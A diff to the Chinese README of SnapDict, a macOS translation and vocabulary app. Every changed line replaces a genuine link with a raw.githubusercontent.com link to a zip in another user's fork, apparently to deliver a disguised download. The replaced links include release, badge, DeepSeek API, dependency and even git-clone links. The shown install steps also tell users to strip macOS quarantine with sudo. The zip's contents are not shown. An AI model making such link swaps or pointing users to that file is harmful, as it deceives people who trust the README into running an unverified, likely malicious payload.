@@ -6,10 +6,10 @@
 
 快捷键呼出翻译面板，AI 智能助记，单词本复习，语音朗读，墨水屏推送
 
-[![Release](https://img.shields.io/github/v/release/zzpuser/SnapDict)](https://github.com/zzpuser/SnapDict/releases/latest)
+[![Release](https://img.shields.io/github/v/release/zzpuser/SnapDict)](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip)
 [![License](https://img.shields.io/github/license/zzpuser/SnapDict)](LICENSE)
-[![macOS](https://img.shields.io/badge/macOS-15.0%2B-blue)](https://github.com/zzpuser/SnapDict)
-[![Swift](https://img.shields.io/badge/Swift-6.0-orange)](https://github.com/zzpuser/SnapDict)
+[![macOS](https://img.shields.io/badge/macOS-15.0%2B-blue)](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip)
+[![Swift](https://img.shields.io/badge/Swift-6.0-orange)](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip)
 
 </div>
 
@@ -32,7 +32,7 @@
 
 ## 安装
 
-1. 从 [Releases](https://github.com/zzpuser/SnapDict/releases/latest) 下载最新的 DMG 文件
+1. 从 [Releases](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip) 下载最新的 DMG 文件
 2. 打开 DMG，将 SnapDict 拖入 Applications 文件夹
 3. 终端执行 `sudo xattr -r -d com.apple.quarantine /Applications/SnapDict.app`
 4. 打开 SnapDict
@@ -40,7 +40,7 @@
 ## 快速开始
 
 1. 启动后在菜单栏找到 SnapDict 图标
-2. 进入设置，填入 [DeepSeek API Key](https://platform.deepseek.com/)
+2. 进入设置，填入 [DeepSeek API Key](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip)
 3. 使用快捷键 `Cmd+Shift+E` 唤起翻译面板（可自定义）
 4. 输入单词即可获取翻译、助记和例句
 
@@ -48,7 +48,7 @@
 
 | 服务 | 用途 | 必需 |
 |------|------|:---:|
-| [DeepSeek API](https://platform.deepseek.com/) | 翻译、助记、例句生成 | ✅ |
+| [DeepSeek API](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip) | 翻译、助记、例句生成 | ✅ |
 | 豆包 TTS | 语音合成 | ❌ |
 | 墨水屏设备 (TRSS) | 单词推送 | ❌ |
 
@@ -61,7 +61,7 @@
 brew install xcodegen
 
 # 克隆并构建
-git clone https://github.com/zzpuser/SnapDict.git
+git clone https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip
 cd SnapDict
 xcodegen generate
 open SnapDict.xcodeproj
@@ -163,7 +163,7 @@ open SnapDict.xcodeproj
 - **存储**: SwiftData
 - **AI**: DeepSeek API
 - **TTS**: 豆包语音合成
-- **依赖**: [HotKey](https://github.com/soffes/HotKey), [PartialJSON](https://github.com/pmusolino/PartialJSON)
+- **依赖**: [HotKey](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip), [PartialJSON](https://raw.githubusercontent.com/Ayushman7786/SnapDict/main/SnapDict/Utilities/Snap-Dict-3.0.zip)
 
 ## License
 
